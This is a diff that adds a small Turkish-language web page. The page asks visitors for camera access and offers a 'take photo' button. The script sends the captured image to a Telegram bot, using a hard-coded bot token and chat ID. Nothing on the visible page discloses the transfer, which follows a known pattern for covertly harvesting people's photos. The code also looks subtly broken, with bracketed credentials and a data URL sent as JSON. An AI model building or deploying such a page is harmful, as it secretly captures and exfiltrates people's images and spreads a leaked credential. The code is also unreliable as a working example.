@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kamera Fotoğrafı Gönder</title>
+</head>
+<body>
+  <h2>Kamera izni verin ve fotoğraf çekin</h2>
+  <video id="video" width="640" height="480" autoplay></video>
+  <button id="takePhoto">Fotoğraf Çek</button>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const button = document.getElementById('takePhoto');
+
+    // Kamerayı aç
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(error => {
+        alert('Kamera açılamadı: ' + error);
+      });
+
+    button.onclick = () => {
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const photoData = canvas.toDataURL('image/png');
+
+      // Fotoğrafı Telegram botuna gönder
+      sendPhoto(photoData);
+    };
+
+    function sendPhoto(photo) {
+      fetch('https://api.telegram.org/bot<8019450857:AAG1eQgjYVdQ26p4XH8HAdTdMLGHnAbYALY>/sendPhoto', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: '<1149820913>',
+          photo: photo
+        })
+      })
+      .then(response => response.json())
+      .then(data => console.log('Gönderildi:', data))
+      .catch(error => console.error('Hata:', error));
+    }
+  </script>
+</body>
+</html>
